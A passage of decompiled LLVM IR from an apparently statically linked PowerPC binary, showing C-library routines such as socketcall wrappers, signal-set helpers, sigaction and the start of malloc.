  %v1_1000ddec = mul i32 %v0_1000dd20, 4
  %v2_1000ddf0 = add i32 %v1_1000ddec, 4
  %v2_1000ddf4 = add i32 %v2_1000ddf0, %v1_1000ddf0
  %v3_1000ddf4 = inttoptr i32 %v2_1000ddf4 to i32*
  store i32 0, i32* %v3_1000ddf4, align 4
  %v0_1000de00 = load i32, i32* @r25, align 4
  %v2_1000de00 = add i32 %v0_1000de00, %v1_1000ddec
  store i32 %v2_1000de00, i32* %r11.global-to-local, align 4
  %v1_1000de04 = load i32, i32* @r31, align 4
  %v2_1000de04 = sub i32 %v1_1000de04, %v2_1000de00
  %v1_1000de08 = add i32 %v2_1000de00, 8
  store i32 %v1_1000de08, i32* @r31, align 4
  %v0_1000de0c = load i32, i32* @r27, align 4
  %v2_1000de0c = add i32 %v0_1000de0c, %v2_1000de04
  %v1_1000de10 = add i32 %v2_1000de0c, -8
  br label %dec_label_pc_1000de14

dec_label_pc_1000de14:                            ; preds = %dec_label_pc_1000dd70.dec_label_pc_1000de14_crit_edge, %dec_label_pc_1000dde4
  %v0_1000de1c = phi i32 [ %v0_1000de1c.pre, %dec_label_pc_1000dd70.dec_label_pc_1000de14_crit_edge ], [ %v1_1000de08, %dec_label_pc_1000dde4 ]
  %v0_1000de18 = phi i32 [ %v1_1000dd4c, %dec_label_pc_1000dd70.dec_label_pc_1000de14_crit_edge ], [ %v1_1000de10, %dec_label_pc_1000dde4 ]
  %v3_1000de14 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000de14, i32* @r4, align 4
  store i32 %v0_1000de1c, i32* %r3.global-to-local, align 4
  store i32 268492324, i32* @lr, align 4
  %v3_1000de20 = call i32 @strncpy(i32 %v0_1000de1c, i32 %v3_1000de14, i32 %v0_1000de18)
  %v3_1000de24 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000de24, i32* @r3, align 4
  store i32 268492332, i32* @lr, align 4
  %v0_1000de28 = call i32 @free()
  store i32 %v0_1000de28, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* %r0.global-to-local, align 4
  %v3_1000de30 = icmp eq i32 %tmp18, 1
  br i1 %v3_1000de30, label %dec_label_pc_1000de38, label %dec_label_pc_1000de80

dec_label_pc_1000de38:                            ; preds = %dec_label_pc_1000de14
  store i32 4, i32* @r5, align 4
  %v0_1000de40 = load i32, i32* @r30, align 4
  store i32 %v0_1000de40, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000de48.426 to i32), i32* @lr, align 4
  %v0_1000de44 = call i32 @memcpy()
  %v1_1000de4c = load i32, i32* @r26, align 4
  %v2_1000de4c = add i32 %v1_1000de4c, 8
  %v3_1000de4c = inttoptr i32 %v2_1000de4c to i32*
  store i32 2, i32* %v3_1000de4c, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1000de54 = load i32, i32* @r26, align 4
  %v2_1000de54 = add i32 %v1_1000de54, 12
  %v3_1000de54 = inttoptr i32 %v2_1000de54 to i32*
  store i32 4, i32* %v3_1000de54, align 4
  %v0_1000de58 = load i32, i32* @r31, align 4
  %v1_1000de58 = load i32, i32* @r26, align 4
  %v2_1000de58 = inttoptr i32 %v1_1000de58 to i32*
  store i32 %v0_1000de58, i32* %v2_1000de58, align 4
  %v0_1000de5c = load i32, i32* @r25, align 4
  %v1_1000de5c = load i32, i32* @r26, align 4
  %v2_1000de5c = add i32 %v1_1000de5c, 16
  %v3_1000de5c = inttoptr i32 %v2_1000de5c to i32*
  store i32 %v0_1000de5c, i32* %v3_1000de5c, align 4
  %v0_1000de60 = load i32, i32* @r21, align 4
  %v1_1000de60 = load i32, i32* @r26, align 4
  %v2_1000de60 = add i32 %v1_1000de60, 4
  %v3_1000de60 = inttoptr i32 %v2_1000de60 to i32*
  store i32 %v0_1000de60, i32* %v3_1000de60, align 4
  %v3_1000de64 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000de64, i32* @r3, align 4
  store i32 268492396, i32* @lr, align 4
  %v0_1000de68 = call i32 @free()
  store i32 %v0_1000de68, i32* %r3.global-to-local, align 4
  %v0_1000de6c = load i32, i32* @r26, align 4
  %v1_1000de6c = load i32, i32* @r20, align 4
  %v2_1000de6c = inttoptr i32 %v1_1000de6c to i32*
  store i32 %v0_1000de6c, i32* %v2_1000de6c, align 4
  br label %dec_label_pc_1000de78

dec_label_pc_1000de78:                            ; preds = %dec_label_pc_1000de80, %dec_label_pc_1000dcc4, %dec_label_pc_1000de38
  %storemerge1 = phi i32 [ 0, %dec_label_pc_1000de38 ], [ 2, %dec_label_pc_1000dcc4 ], [ 2, %dec_label_pc_1000de80 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_1000de38 ], [ 1, %dec_label_pc_1000dcc4 ], [ 1, %dec_label_pc_1000de80 ]
  store i32 %storemerge1, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_1000de78 = load i32, i32* @r24, align 4
  %v2_1000de78 = inttoptr i32 %v1_1000de78 to i32*
  store i32 %storemerge, i32* %v2_1000de78, align 4
  br label %dec_label_pc_1000de98

dec_label_pc_1000de80:                            ; preds = %dec_label_pc_1000de14
  %v3_1000de80 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000de80, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000de88.427 to i32), i32* @lr, align 4
  %v0_1000de84 = call i32 @free()
  store i32 %v0_1000de84, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000de78

dec_label_pc_1000de94:                            ; preds = %dec_label_pc_1000dc58, %dec_label_pc_1000dc3c, %dec_label_pc_1000dc30, %dec_label_pc_1000dc20, %dec_label_pc_1000dc10
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000de98

dec_label_pc_1000de98:                            ; preds = %dec_label_pc_1000dbf4, %dec_label_pc_1000dbec, %dec_label_pc_1000dba0, %entry, %dec_label_pc_1000de78, %dec_label_pc_1000dd54, %dec_label_pc_1000dc98, %dec_label_pc_1000de94
  store i32 %v0_1000db6c, i32* %r0.global-to-local, align 4
  %v0_1000dea8 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000dea8

; uselistorder directives
  uselistorder i32 %v0_1000de1c, { 1, 0 }
  uselistorder i32 %v1_1000ddec, { 1, 0 }
  uselistorder i32 %v1_1000dde0, { 1, 0 }
  uselistorder i32 %v2_1000dddc, { 1, 0 }
  uselistorder i32 %v1_1000ddd8, { 1, 0 }
  uselistorder i32 %v0_1000ddc4, { 1, 0 }
  uselistorder i32 %v1_1000ddd83, { 1, 0 }
  uselistorder i32 %v1_1000dda0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000dd98, { 1, 0, 2 }
  uselistorder i32 %v0_1000dd20, { 0, 5, 4, 1, 3, 2 }
  uselistorder i32 %v1_1000dc64, { 1, 0, 2 }
  uselistorder i32 %v0_1000dc20.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1000dc08, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp19, { 0, 1, 3, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 20, 3, 4, 0, 22, 19, 5, 18, 6, 7, 8, 9, 11, 10, 12, 2, 13, 14, 21, 15, 16, 17, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3, 4, 5, 19, 8, 6, 7, 9, 10, 11, 12, 13, 15, 16, 14, 17, 18 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder label %dec_label_pc_1000de98, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000de78, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000de14, { 1, 0 }
  uselistorder label %dec_label_pc_1000ddc0, { 1, 0 }
  uselistorder label %dec_label_pc_1000dc20, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000dec0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268492496, i32* @lr, align 4
  %v2_1000decc = call i32 @__socketcall(i32 5, i32 %v2_1000dec0)
  ret i32 %v2_1000decc

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @bind() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v0_1000dee8 = load i32, i32* @r3, align 4
  store i32 %v0_1000dee8, i32* %stack_var_-24, align 4
  %v2_1000def4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268492548, i32* @lr, align 4
  %v2_1000df00 = call i32 @__socketcall(i32 2, i32 %v2_1000def4)
  ret i32 %v2_1000df00

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000df28 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268492600, i32* @lr, align 4
  %v2_1000df34 = call i32 @__socketcall(i32 3, i32 %v2_1000df28)
  ret i32 %v2_1000df34

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000df5c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268492648, i32* @lr, align 4
  %v2_1000df64 = call i32 @__socketcall(i32 4, i32 %v2_1000df5c)
  ret i32 %v2_1000df64

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000df8c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268492704, i32* @lr, align 4
  %v2_1000df9c = call i32 @__socketcall(i32 10, i32 %v2_1000df8c)
  ret i32 %v2_1000df9c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg6, i32* @r8, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000dfc4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268492768, i32* @lr, align 4
  %v2_1000dfdc = call i32 @__socketcall(i32 12, i32 %v2_1000dfc4)
  ret i32 %v2_1000dfdc

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__libc_recvmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000e004 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268492820, i32* @lr, align 4
  %v2_1000e010 = call i32 @__socketcall(i32 17, i32 %v2_1000e004)
  ret i32 %v2_1000e010

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000e038 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268492876, i32* @lr, align 4
  %v2_1000e048 = call i32 @__socketcall(i32 9, i32 %v2_1000e038)
  ret i32 %v2_1000e048

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_sendmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000e070 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268492928, i32* @lr, align 4
  %v2_1000e07c = call i32 @__socketcall(i32 16, i32 %v2_1000e070)
  ret i32 %v2_1000e07c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg6, i32* @r8, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000e0a4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268492992, i32* @lr, align 4
  %v2_1000e0bc = call i32 @__socketcall(i32 11, i32 %v2_1000e0a4)
  ret i32 %v2_1000e0bc

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000e0e4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268493052, i32* @lr, align 4
  %v2_1000e0f8 = call i32 @__socketcall(i32 14, i32 %v2_1000e0e4)
  ret i32 %v2_1000e0f8

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000e120 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268493104, i32* @lr, align 4
  %v2_1000e12c = call i32 @__socketcall(i32 1, i32 %v2_1000e120)
  ret i32 %v2_1000e12c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 0, 1, 3, 11, 8, 10, 9, 6, 5, 7, 2, 4 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_1000e144 = load i32, i32* @lr, align 4
  store i32 %v0_1000e144, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000e150 = icmp eq i32* %arg2, null
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_1000e160 = add i32 %tmp, 4
  store i32 %v1_1000e160, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  %v2_1000e168 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_1000e168, i32* @r3, align 4
  br i1 %v3_1000e150, label %dec_label_pc_1000e190, label %dec_label_pc_1000e170

dec_label_pc_1000e170:                            ; preds = %entry
  %v2_1000e170 = load i32, i32* %arg2, align 4
  store i32 %v2_1000e170, i32* %r0.global-to-local, align 4
  store i32 268493180, i32* @lr, align 4
  %v0_1000e178 = call i32 @memcpy()
  %v0_1000e17c = load i32, i32* @r31, align 4
  %v1_1000e17c = add i32 %v0_1000e17c, 132
  %v2_1000e17c = inttoptr i32 %v1_1000e17c to i32*
  %v3_1000e17c = load i32, i32* %v2_1000e17c, align 4
  store i32 %v3_1000e17c, i32* %r0.global-to-local, align 4
  %v1_1000e188 = add i32 %v0_1000e17c, 136
  %v2_1000e188 = inttoptr i32 %v1_1000e188 to i32*
  %v3_1000e188 = load i32, i32* %v2_1000e188, align 4
  store i32 %v3_1000e188, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000e190

dec_label_pc_1000e190:                            ; preds = %entry, %dec_label_pc_1000e170
  store i32 268493232, i32* @lr, align 4
  %v0_1000e1ac = call i32 @__syscall_rt_sigaction()
  %v0_1000e1b0 = load i32, i32* @r30, align 4
  %v3_1000e1b0 = icmp eq i32 %v0_1000e1b0, 0
  store i32 %v0_1000e1ac, i32* @r31, align 4
  br i1 %v3_1000e1b0, label %dec_label_pc_1000e1ec, label %dec_label_pc_1000e1c0

dec_label_pc_1000e1c0:                            ; preds = %dec_label_pc_1000e190
  %v1_1000e1b8 = icmp slt i32 %v0_1000e1ac, 0
  %v1_1000e1c0 = add i32 %v0_1000e1b0, 4
  store i32 %v1_1000e1c0, i32* @r3, align 4
  %v2_1000e1c4 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1000e1c4, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  br i1 %v1_1000e1b8, label %dec_label_pc_1000e1ec, label %dec_label_pc_1000e1d0

dec_label_pc_1000e1d0:                            ; preds = %dec_label_pc_1000e1c0
  %v3_1000e1d0 = load i32, i32* %stack_var_-172, align 4
  store i32 %v3_1000e1d0, i32* %r0.global-to-local, align 4
  %v2_1000e1d4 = inttoptr i32 %v0_1000e1b0 to i32*
  store i32 %v3_1000e1d0, i32* %v2_1000e1d4, align 4
  store i32 268493276, i32* @lr, align 4
  %v0_1000e1d8 = call i32 @memcpy()
  store i32 %tmp6, i32* @r9, align 4
  %v1_1000e1e4 = load i32, i32* @r30, align 4
  %v2_1000e1e4 = add i32 %v1_1000e1e4, 136
  %v3_1000e1e4 = inttoptr i32 %v2_1000e1e4 to i32*
  store i32 %tmp6, i32* %v3_1000e1e4, align 4
  %v0_1000e1e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e1e8 = load i32, i32* @r30, align 4
  %v2_1000e1e8 = add i32 %v1_1000e1e8, 132
  %v3_1000e1e8 = inttoptr i32 %v2_1000e1e8 to i32*
  store i32 %v0_1000e1e8, i32* %v3_1000e1e8, align 4
  %v0_1000e1f0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e1ec

dec_label_pc_1000e1ec:                            ; preds = %dec_label_pc_1000e1c0, %dec_label_pc_1000e190, %dec_label_pc_1000e1d0
  %v0_1000e1f0 = phi i32 [ %v0_1000e1ac, %dec_label_pc_1000e1c0 ], [ %v0_1000e1ac, %dec_label_pc_1000e190 ], [ %v0_1000e1f0.pre, %dec_label_pc_1000e1d0 ]
  store i32 %v0_1000e144, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000e1f0

; uselistorder directives
  uselistorder i32 %v0_1000e1ac, { 0, 1, 3, 2 }
  uselistorder i32 %tmp6, { 1, 0 }
  uselistorder label %dec_label_pc_1000e1ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e190, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_1000e234, label %dec_label_pc_1000e220

dec_label_pc_1000e220:                            ; preds = %entry
  %v0_1000e220 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000e22c = inttoptr i32 %v0_1000e220 to i32*
  store i32 22, i32* %v2_1000e22c, align 4
  %v0_1000e240.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000e23c

dec_label_pc_1000e234:                            ; preds = %entry
  %v0_1000e234 = call i32 @__sigaddset()
  store i32 %v0_1000e234, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000e23c

dec_label_pc_1000e23c:                            ; preds = %dec_label_pc_1000e220, %dec_label_pc_1000e234
  %v0_1000e240 = phi i32 [ %v0_1000e240.pre, %dec_label_pc_1000e220 ], [ %v0_1000e234, %dec_label_pc_1000e234 ]
  ret i32 %v0_1000e240

; uselistorder directives
  uselistorder label %dec_label_pc_1000e23c, { 1, 0 }
}

define i32 @__GI_sigdelset(i32 %arg1) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_1000e280, label %dec_label_pc_1000e26c

dec_label_pc_1000e26c:                            ; preds = %entry
  %v0_1000e26c = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000e278 = inttoptr i32 %v0_1000e26c to i32*
  store i32 22, i32* %v2_1000e278, align 4
  %v0_1000e28c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000e288

dec_label_pc_1000e280:                            ; preds = %entry
  %v0_1000e280 = call i32 @__sigdelset()
  store i32 %v0_1000e280, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000e288

dec_label_pc_1000e288:                            ; preds = %dec_label_pc_1000e26c, %dec_label_pc_1000e280
  %v0_1000e28c = phi i32 [ %v0_1000e28c.pre, %dec_label_pc_1000e26c ], [ %v0_1000e280, %dec_label_pc_1000e280 ]
  ret i32 %v0_1000e28c

; uselistorder directives
  uselistorder label %dec_label_pc_1000e288, { 1, 0 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268493492, i32* @lr, align 4
  %v3_1000e2b0 = call i32 @__GI_memset(i32 0, i32 128, i32 128)
  ret i32 0
}

define i32 @sigfillset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268493536, i32* @lr, align 4
  %v3_1000e2dc = call i32 @__GI_memset(i32 255, i32 128, i32 128)
  ret i32 0
}

define i32 @sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_1000e324, label %dec_label_pc_1000e310

dec_label_pc_1000e310:                            ; preds = %entry
  %v0_1000e310 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000e31c = inttoptr i32 %v0_1000e310 to i32*
  store i32 22, i32* %v2_1000e31c, align 4
  %v0_1000e330.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000e32c

dec_label_pc_1000e324:                            ; preds = %entry
  %v0_1000e324 = call i32 @__sigismember()
  store i32 %v0_1000e324, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000e32c

dec_label_pc_1000e32c:                            ; preds = %dec_label_pc_1000e310, %dec_label_pc_1000e324
  %v0_1000e330 = phi i32 [ %v0_1000e330.pre, %dec_label_pc_1000e310 ], [ %v0_1000e324, %dec_label_pc_1000e324 ]
  ret i32 %v0_1000e330

; uselistorder directives
  uselistorder label %dec_label_pc_1000e32c, { 1, 0 }
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %v0_1000e340 = load i32, i32* @r4, align 4
  %v3_1000e340 = icmp eq i32 %v0_1000e340, 0
  %v0_1000e34c = load i32, i32* @r3, align 4
  %v0_1000e354 = load i32, i32* @r31, align 4
  store i32 %v0_1000e34c, i32* @r31, align 4
  br i1 %v3_1000e340, label %dec_label_pc_1000e378, label %dec_label_pc_1000e368

dec_label_pc_1000e368:                            ; preds = %entry
  %v1_1000e34c = add i32 %v0_1000e34c, 452
  store i32 ptrtoint (i32* @global_var_1000e36c.431 to i32), i32* @lr, align 4
  %v3_1000e368 = call i32 @__GI_sigprocmask(i32 0, i32 0, i32 %v1_1000e34c)
  %v3_1000e370 = icmp eq i32 %v3_1000e368, 0
  br i1 %v3_1000e370, label %dec_label_pc_1000e37c, label %dec_label_pc_1000e378

dec_label_pc_1000e378:                            ; preds = %dec_label_pc_1000e368, %entry
  br label %dec_label_pc_1000e37c

dec_label_pc_1000e37c:                            ; preds = %dec_label_pc_1000e368, %dec_label_pc_1000e378
  %v0_1000e37c = phi i32 [ 1, %dec_label_pc_1000e368 ], [ 0, %dec_label_pc_1000e378 ]
  %v1_1000e37c = load i32, i32* @r31, align 4
  %v2_1000e37c = add i32 %v1_1000e37c, 448
  %v3_1000e37c = inttoptr i32 %v2_1000e37c to i32*
  store i32 %v0_1000e37c, i32* %v3_1000e37c, align 4
  store i32 %v0_1000e354, i32* @r31, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1000e34c, { 1, 0 }
  uselistorder i32 448, { 2, 0, 1 }
  uselistorder i32 452, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e37c, { 1, 0 }
}

define i32 @__sigismember() local_unnamed_addr {
entry:
  %v0_1000e398 = load i32, i32* @r4, align 4
  %v1_1000e398 = add i32 %v0_1000e398, -1
  %v1_1000e39c = call i32 @__asm_rlwinm(i32 %v1_1000e398, i32 29, i32 3, i32 29)
  %v1_1000e3a0 = urem i32 %v1_1000e398, 32
  %v0_1000e3a4 = load i32, i32* @r3, align 4
  %v2_1000e3a4 = add i32 %v0_1000e3a4, %v1_1000e39c
  %v3_1000e3a4 = inttoptr i32 %v2_1000e3a4 to i32*
  %v4_1000e3a4 = load i32, i32* %v3_1000e3a4, align 4
  %v3_1000e3ac = shl i32 1, %v1_1000e3a0
  %v2_1000e3b0 = and i32 %v4_1000e3a4, %v3_1000e3ac
  %v2_1000e3b4 = icmp ne i32 %v2_1000e3b0, 0
  %v5_1000e3b8 = zext i1 %v2_1000e3b4 to i32
  ret i32 %v5_1000e3b8
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000e3c0 = load i32, i32* @r4, align 4
  %v1_1000e3c0 = add i32 %v0_1000e3c0, -1
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000e3c8 = call i32 @__asm_rlwinm(i32 %v1_1000e3c0, i32 29, i32 3, i32 29)
  store i32 %v1_1000e3c8, i32* @r11, align 4
  %v1_1000e3cc = urem i32 %v1_1000e3c0, 32
  %v1_1000e3d0 = load i32, i32* @r3, align 4
  %v2_1000e3d0 = add i32 %v1_1000e3d0, %v1_1000e3c8
  %v3_1000e3d0 = inttoptr i32 %v2_1000e3d0 to i32*
  %v4_1000e3d0 = load i32, i32* %v3_1000e3d0, align 4
  %v0_1000e3d4 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000e3d4 = shl i32 %v0_1000e3d4, %v1_1000e3cc
  store i32 %v3_1000e3d4, i32* %r0.global-to-local, align 4
  %v2_1000e3d8 = or i32 %v3_1000e3d4, %v4_1000e3d0
  store i32 %v2_1000e3d8, i32* %v3_1000e3d0, align 4
  ret i32 0
}

define i32 @__sigdelset() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000e3e8 = load i32, i32* @r4, align 4
  %v1_1000e3e8 = add i32 %v0_1000e3e8, -1
  store i32 -2, i32* %r0.global-to-local, align 4
  %v1_1000e3f0 = call i32 @__asm_rlwinm(i32 %v1_1000e3e8, i32 29, i32 3, i32 29)
  store i32 %v1_1000e3f0, i32* @r11, align 4
  %v1_1000e3f4 = urem i32 %v1_1000e3e8, 32
  %v1_1000e3f8 = load i32, i32* @r3, align 4
  %v2_1000e3f8 = add i32 %v1_1000e3f8, %v1_1000e3f0
  %v3_1000e3f8 = inttoptr i32 %v2_1000e3f8 to i32*
  %v4_1000e3f8 = load i32, i32* %v3_1000e3f8, align 4
  %v0_1000e3fc = load i32, i32* %r0.global-to-local, align 4
  %v3_1000e3fc = shl i32 %v0_1000e3fc, %v1_1000e3f4
  %v4_1000e3fc = sub nsw i32 32, %v1_1000e3f4
  %v5_1000e3fc = lshr i32 %v0_1000e3fc, %v4_1000e3fc
  %v6_1000e3fc = or i32 %v5_1000e3fc, %v3_1000e3fc
  store i32 %v6_1000e3fc, i32* %r0.global-to-local, align 4
  %v2_1000e400 = and i32 %v6_1000e3fc, %v4_1000e3f8
  store i32 %v2_1000e400, i32* %v3_1000e3f8, align 4
  ret i32 0
}

define i32 @malloc() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1000e410 = load i32, i32* @r3, align 4
  %v3_1000e410 = icmp eq i32 %v0_1000e410, 0
  br i1 %v3_1000e410, label %dec_label_pc_1000e428, label %dec_label_pc_1000e42c

dec_label_pc_1000e428:                            ; preds = %entry
  br label %dec_label_pc_1000e42c

dec_label_pc_1000e42c:                            ; preds = %entry, %dec_label_pc_1000e428
  %v0_1000e43c = phi i32 [ 1, %dec_label_pc_1000e428 ], [ %v0_1000e410, %entry ]
  %v3_1000e430 = icmp ugt i32 %v0_1000e43c, -8
  br i1 %v3_1000e430, label %dec_label_pc_1000e540, label %dec_label_pc_1000e438

dec_label_pc_1000e438:                            ; preds = %dec_label_pc_1000e42c
  %v1_1000e43c = add i32 %v0_1000e43c, 4
  store i32 ptrtoint (i32* @global_var_1003383c.206 to i32), i32* @r29, align 4
  store i32 %v1_1000e43c, i32* %stack_var_-40, align 4
  store i32 268493904, i32* @lr, align 4
  %v1_1000e44c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1003383c.206 to i32))
  %v2_1000e454 = ptrtoint i32* %stack_var_-40 to i32
  %v3_1000e45c = call i32 @__heap_alloc(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32 -4192) to i32*), i32 %v2_1000e454)
  store i32 %v3_1000e45c, i32* @r31, align 4
  %v0_1000e464 = load i32, i32* @r29, align 4
  store i32 %v0_1000e464, i32* @r3, align 4
  store i32 268493932, i32* @lr, align 4
  %v0_1000e468 = call i32 @pthread_mutex_unlock()
  %v0_1000e46c = load i32, i32* @r31, align 4
